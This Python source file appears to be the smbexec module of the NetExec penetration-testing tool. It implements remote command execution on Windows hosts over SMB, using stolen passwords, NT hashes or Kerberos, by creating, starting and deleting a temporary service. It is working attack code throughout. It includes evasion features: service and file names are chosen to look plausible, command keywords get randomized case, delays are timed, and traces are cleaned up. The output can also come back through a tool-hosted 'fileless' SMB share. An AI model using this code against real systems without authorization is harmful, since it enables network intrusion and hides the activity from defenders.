import os
from os.path import join as path_join
from time import sleep
from datetime import datetime
import random
from impacket.dcerpc.v5 import transport, scmr
from nxc.helpers.misc import PLAUSIBLE_SERVICE_NAMES, countdown_timer
from nxc.paths import TMP_PATH
from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_GSS_NEGOTIATE


def randomize_case(s):
    """Randomizes the case of each character in a string."""
    return "".join(random.choice([c.upper(), c.lower()]) for c in s)


class SMBEXEC:
    def __init__(self, host, share_name, smbconnection, username="", password="", domain="", doKerberos=False, aesKey=None, remoteHost=None, kdcHost=None, hashes=None, share=None, port=445, logger=None, tries=None, nobfs=False, no_delays=False):
        self.__host = host
        self.__share_name = share_name
        self.__port = port
        self.__username = username
        self.__password = password

        # Choose a random plausible name and append timestamp for the service name
        chosen_name = random.choice(PLAUSIBLE_SERVICE_NAMES)
        timestamp = datetime.now().strftime("%Y%m%d%H%M%S")
        self.__serviceName = f"{chosen_name}_{timestamp}"

        self.__domain = domain
        self.__lmhash = ""
        self.__nthash = ""
        self.__share = share
        self.__smbconnection = smbconnection
        self.__output = None
        self.__batchFile = None
        self.__outputBuffer = b""
        self.__shell = "%COMSPEC% /q /c "
        self.__retOutput = False
        self.__rpctransport = None
        self.__scmr = None
        self.__aesKey = aesKey
        self.__doKerberos = doKerberos
        self.__remoteHost = remoteHost
        self.__kdcHost = kdcHost
        self.__tries = tries
        self.logger = logger
        self.__no_delays = no_delays
        self.__nobfs = nobfs

        if hashes is not None:
            # This checks to see if we didn't provide the LM Hash
            if hashes.find(":") != -1:
                self.__lmhash, self.__nthash = hashes.split(":")
            else:
                self.__nthash = hashes

        if self.__password is None:
            self.__password = ""

        stringbinding = f"ncacn_np:{self.__host}[\\pipe\\svcctl]"
        self.logger.debug(f"StringBinding {stringbinding}")
        self.__rpctransport = transport.DCERPCTransportFactory(stringbinding)
        self.__rpctransport.set_dport(self.__port)

        if hasattr(self.__rpctransport, "setRemoteHost"):
            self.__rpctransport.setRemoteHost(self.__remoteHost)

        if hasattr(self.__rpctransport, "set_credentials"):
            # This method exists only for selected protocol sequences.
            self.__rpctransport.set_credentials(
                self.__username,
                self.__password,
                self.__domain,
                self.__lmhash,
                self.__nthash,
                self.__aesKey,
            )
            self.__rpctransport.set_kerberos(self.__doKerberos, self.__kdcHost)

        self.__scmr = self.__rpctransport.get_dce_rpc()
        if self.__doKerberos:
            self.__scmr.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)
        self.__scmr.connect()
        s = self.__rpctransport.get_smb_connection()
        # We don't wanna deal with timeouts from now on.
        s.setTimeout(100000)

        self.__scmr.bind(scmr.MSRPC_UUID_SCMR)
        resp = scmr.hROpenSCManagerW(self.__scmr)
        self.__scHandle = resp["lpScHandle"]

    def execute(self, command, output=False):
        self.__retOutput = output
        if os.path.isfile(command):
            with open(command) as commands:
                for c in commands:
                    self.execute_remote(c.strip())
        else:
            self.execute_remote(command)
        self.finish()
        return self.__outputBuffer

    def output_callback(self, data):
        self.__outputBuffer += data

    def execute_remote(self, data):
        # Generate output and batch file names based on plausible names and timestamp
        chosen_name = random.choice(PLAUSIBLE_SERVICE_NAMES)
        # Added microseconds for higher uniqueness between calls
        timestamp = datetime.now().strftime("%Y%m%d%H%M%S%f")
        base_name = f"{chosen_name}_{timestamp}"
        self.__output = f"{base_name}_out"
        self.__batchFile = f"{base_name}_batch.bat"

        # Determine strings based on nobfs flag
        if self.__nobfs:
            comspec_final = "cmd.exe"  # Use cmd.exe directly
            echo_val = "echo"
            move_val = "move"
            q_flag_val = "/q"  # Use lowercase /q
            c_flag_val = "/c"
            localappdata_final = "%LOCALAPPDATA%"  # Standard env var usage
        else:
            comspec_final = f"%{randomize_case('COMSPEC')}%"
            echo_val = randomize_case("echo")
            move_val = randomize_case("move")
            q_flag_val = randomize_case("/q")  # Randomize lowercase /q
            c_flag_val = randomize_case("/c")
            localappdata_final = f"%{randomize_case('LOCALAPPDATA')}%"

        delete_logic = f"{move_val} /y {localappdata_final}\\\\{self.__batchFile} NUL"
        string_to_echo_into_batch = f"{data} ^> \\\\127.0.0.1\\{self.__share}\\{self.__output} 2^>^&1"

        command = (
            f"{comspec_final} {q_flag_val} {c_flag_val} {echo_val} {string_to_echo_into_batch} > {localappdata_final}\\\\{self.__batchFile} & "
            f"{comspec_final} {q_flag_val} {c_flag_val} {localappdata_final}\\\\{self.__batchFile} & "
            f"{comspec_final} {q_flag_val} {c_flag_val} {delete_logic}"
        ) if self.__retOutput else f"{comspec_final} {q_flag_val} {c_flag_val} {data}"

        # The local file at TMP_PATH is not directly used by the remote service in this method.
        # It's more of a placeholder or for other potential uses not realized here.
        with open(path_join(TMP_PATH, self.__batchFile), "w"):
            pass  # Not writing `command` or `string_to_echo_into_batch` here for `execute_remote`.

        self.logger.debug(f"Content to be echoed into remote batch file: {string_to_echo_into_batch}")
        self.logger.debug(f"Service lpBinaryPathName: {command}")
        self.logger.debug(f"Remote service {self.__serviceName} created.")

        try:
            # Introduce delay before creating service
            if not self.__no_delays:
                self.logger.debug("Applying delay before creating service")
                countdown_timer()
            self.logger.debug(f"Creating remote service {self.__serviceName}")
            resp = scmr.hRCreateServiceW(
                self.__scmr,
                self.__scHandle,
                self.__serviceName,
                self.__serviceName,
                lpBinaryPathName=command,
                dwStartType=scmr.SERVICE_DEMAND_START,
            )
            service = resp["lpServiceHandle"]
        except Exception as e:
            if "rpc_s_access_denied" in str(e):
                self.logger.fail("SMBEXEC: Create services got blocked.")
            else:
                self.logger.fail(str(e))

            return self.__outputBuffer

        try:
            # Introduce delay before starting service
            if not self.__no_delays:
                self.logger.debug("Applying delay before starting service")
                countdown_timer()
            self.logger.debug(f"Starting remote service {self.__serviceName}")
            scmr.hRStartServiceW(self.__scmr, service)
        except Exception:
            pass

        try:
            # Introduce delay before deleting service
            if not self.__no_delays:
                self.logger.debug("Applying delay before deleting service")
                countdown_timer()
            self.logger.debug(f"Deleting remote service {self.__serviceName}")
            scmr.hRDeleteService(self.__scmr, service)
            scmr.hRCloseServiceHandle(self.__scmr, service)
        except Exception:
            pass

        self.get_output_remote()

    def get_output_remote(self):
        if self.__retOutput is False:
            self.__outputBuffer = ""
            return

        tries = 1
        while True:
            try:
                self.logger.info(f"Attempting to read {self.__share}\\{self.__output}")
                self.__smbconnection.getFile(self.__share, self.__output, self.output_callback)
                break
            except Exception as e:
                if tries >= self.__tries:
                    self.logger.fail("SMBEXEC: Could not retrieve output file, it may have been detected by AV. Please increase the number of tries with the option '--get-output-tries'. If it is still failing, try the 'wmi' protocol or another exec method")
                    break
                if "STATUS_BAD_NETWORK_NAME" in str(e):
                    self.logger.fail(f"SMBEXEC: Getting the output file failed - target has blocked access to the share: {self.__share} (but the command may have executed!)")
                    break
                elif "STATUS_VIRUS_INFECTED" in str(e):
                    self.logger.fail("Command did not run because a virus was detected")
                    break
                # When executing powershell and the command is still running, we get a sharing violation
                # We can use that information to wait longer than if the file is not found (probably av or something)
                if "STATUS_SHARING_VIOLATION" in str(e):
                    self.logger.info(f"File {self.__share}\\{self.__output} is still in use with {self.__tries - tries} tries left, retrying...")
                    tries += 1
                    sleep(1)
                elif "STATUS_OBJECT_NAME_NOT_FOUND" in str(e):
                    self.logger.info(f"File {self.__share}\\{self.__output} not found with {self.__tries - tries} tries left, deducting 10 tries and retrying...")
                    tries += 10
                    sleep(1)
                else:
                    self.logger.debug(f"Exception when trying to read output file: {e!s}. {self.__tries - tries} tries left, retrying...")
                    tries += 1
                    sleep(1)

        try:
            self.logger.debug(f"Deleting file {self.__share}\\{self.__output}")
            self.__smbconnection.deleteFile(self.__share, self.__output)
        except Exception:
            pass

    def execute_fileless(self, data):
        # Generate output and batch file names based on plausible names and timestamp
        chosen_name = random.choice(PLAUSIBLE_SERVICE_NAMES)
        # Added microseconds for higher uniqueness between calls
        timestamp = datetime.now().strftime("%Y%m%d%H%M%S%f")
        base_name = f"{chosen_name}_{timestamp}"
        self.__output = f"{base_name}_out"
        self.__batchFile = f"{base_name}_batch.bat"

        # Determine strings based on nobfs flag
        if self.__nobfs:
            comspec_final = "cmd.exe"  # Use cmd.exe directly
            q_flag_val = "/q"  # Use lowercase /q
            c_flag_val = "/c"
        else:
            comspec_final = f"%{randomize_case('COMSPEC')}%"
            q_flag_val = randomize_case("/q")  # Randomize lowercase /q
            c_flag_val = randomize_case("/c")

        local_ip = self.__rpctransport.get_socket().getsockname()[0]

        # This local_batch_command becomes the lpBinaryPathName for the service in this fileless method.
        # Output is redirected to the NXC-hosted SMB share.
        local_batch_command = f"{comspec_final} {q_flag_val} {c_flag_val} {data} ^> \\\\{local_ip}\\{self.__share_name}\\{self.__output}" if self.__retOutput else f"{comspec_final} {q_flag_val} {c_flag_val} {data}"

        # For the fileless method, the file at TMP_PATH is what NXC's SMB server will serve.
        # This file should contain the raw commands to be executed, which is just `data`.
        with open(path_join(TMP_PATH, self.__batchFile), "w") as batch_file:
            batch_file.write(data)

        self.logger.debug(f"Service lpBinaryPathName (fileless): {local_batch_command}")
        self.logger.debug(f"Content of {path_join(TMP_PATH, self.__batchFile)} for NXC SMB server: {data}")

        # Introduce delay before creating service
        if not self.__no_delays:
            self.logger.debug("Applying delay before creating service")
            countdown_timer()
        self.logger.debug(f"Creating remote service {self.__serviceName}")
        resp = scmr.hRCreateServiceW(
            self.__scmr,
            self.__scHandle,
            self.__serviceName,
            self.__serviceName,
            lpBinaryPathName=local_batch_command,
            dwStartType=scmr.SERVICE_DEMAND_START,
        )
        service = resp["lpServiceHandle"]

        try:
            # Introduce delay before starting service
            if not self.__no_delays:
                self.logger.debug("Applying delay before starting service")
                countdown_timer()
            self.logger.debug(f"Starting remote service {self.__serviceName}")
            scmr.hRStartServiceW(self.__scmr, service)
        except Exception:
            pass
        # Introduce delay before deleting service
        if not self.__no_delays:
            self.logger.debug("Applying delay before deleting service")
            countdown_timer()
        self.logger.debug(f"Deleting remote service {self.__serviceName}")
        scmr.hRDeleteService(self.__scmr, service)
        scmr.hRCloseServiceHandle(self.__scmr, service)
        self.get_output_fileless()

    def get_output_fileless(self):
        if not self.__retOutput:
            return

        while True:
            try:
                with open(path_join(TMP_PATH, self.__output), "rb") as output:
                    self.output_callback(output.read())
                break
            except OSError:
                sleep(2)

    def finish(self):
        # Just in case the service is still created
        try:
            self.__scmr = self.__rpctransport.get_dce_rpc()
            self.__scmr.connect()
            self.__scmr.bind(scmr.MSRPC_UUID_SCMR)
            resp = scmr.hROpenSCManagerW(self.__scmr)
            self.__scHandle = resp["lpScHandle"]
            resp = scmr.hROpenServiceW(self.__scmr, self.__scHandle, self.__serviceName)
            service = resp["lpServiceHandle"]
            scmr.hRDeleteService(self.__scmr, service)
            scmr.hRControlService(self.__scmr, service, scmr.SERVICE_CONTROL_STOP)
            scmr.hRCloseServiceHandle(self.__scmr, service)
        except Exception:
            pass
